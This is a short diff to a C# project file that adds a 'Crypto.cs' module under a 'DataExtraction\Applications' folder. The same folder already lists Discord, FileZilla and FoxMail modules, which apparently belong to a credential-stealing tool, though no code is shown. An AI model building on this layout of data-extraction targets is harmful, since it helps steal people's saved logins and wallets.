@@ -66,6 +66,7 @@
   </ItemGroup>
   <ItemGroup>
     <Compile Include="AesGcm\AesGcm.cs" />
+    <Compile Include="DataExtraction\Applications\Crypto.cs" />
     <Compile Include="DataExtraction\Applications\Discord.cs" />
     <Compile Include="DataExtraction\Applications\FileZilla.cs" />
     <Compile Include="DataExtraction\Applications\FoxMail.cs" />
